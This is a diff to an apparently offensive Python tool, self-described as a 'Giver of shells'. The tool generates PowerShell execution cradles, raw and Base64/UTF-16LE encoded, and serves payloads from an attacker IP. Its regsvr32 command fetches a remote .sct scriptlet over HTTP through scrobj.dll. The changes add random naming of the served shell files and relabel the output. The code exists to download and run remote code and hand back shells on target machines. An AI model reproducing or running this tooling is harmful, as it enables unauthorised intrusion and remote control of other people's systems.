@@ -7,9 +7,10 @@ from lib import logger
 
 parser = argparse.ArgumentParser(description = "Giver of shells")
 parser.add_argument('-i', '--ip-address', metavar="",help="Attacker IP Address", required=True)
-parser.add_argument('-p', '--cradle-port', metavar="", help="Port for receiving shells")
+parser.add_argument('-c', '--cradle-port', metavar="", help="Port for receiving shells")
 parser.add_argument('-w', '--web-delivery', metavar="", help="Port for serving shells")
 parser.add_argument('-d', '--directory', metavar="", help="Directory for generated payloads")
+parser.add_argument('--randomize-names', action="store_true", help="Rename retrieved-shells to random string")
 args = parser.parse_args()
 
 if args.ip_address != None:
@@ -109,7 +110,10 @@ def set_resource(filename, filecontents):
 	destination_file.close()
 
 def register_shell(filename, shellcontent):
-	random_shellname = 'ps%s' % randomString()
+	if args.randomize_names:
+		random_shellname = '%s' % randomString(12)
+	else:
+		random_shellname = filename
 	shell_dictionary[filename] = random_shellname
 	set_resource(random_shellname, shellcontent)
 
@@ -125,11 +129,11 @@ def raw_dropper_base64(filename):
 	
 def show_cradles(shell_name,randomized_shell_name):
 	logger.heading(shell_name)
-	print("Raw PowerShell Execution Cradle:")
+	print("Raw PowerShell Payload:")
 	logger.yellow.fg(raw_dropper(randomized_shell_name))
 	print()
 
-	print("Base64/UTF-16LE Encoded PowerShell Execution Cradle:")
+	print("Base64/UTF-16LE Encoded PowerShell Payload:")
 	logger.yellow.fg(raw_dropper_base64(randomized_shell_name))
 	print()
 
@@ -158,7 +162,13 @@ def regsvr32():
 	regsvr32_template_file = resource_directory+'regsvr32.xml'
 	b64_payload = raw_dropper_base64(shell_dictionary[shell_name]) # generates the UTF-16LE powershell IEX payload and encodes it into B64 and stores it
 	regsvr_cradle_scriptlet = get_cradle(regsvr32_template_file,b64_payload) # takes in the template cradle and the b64 payload
-	random_sct_filename = 'sct%s' % randomString(12)
+	random_sct_filename = '%s' % randomString(12)
+
+	if args.randomize_names:
+		random_sct_filename = '%s' % randomString(24)
+	else:
+		random_sct_filename = '%s.sct' % randomString(24)
+
 	execution_cradle_command = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (ipaddr,web_delivery,random_sct_filename)
 	register_cradle('regsvr32',shell_name,random_sct_filename, regsvr_cradle_scriptlet,execution_cradle_command) # filename, shellcontent,execution_cradle. 
 
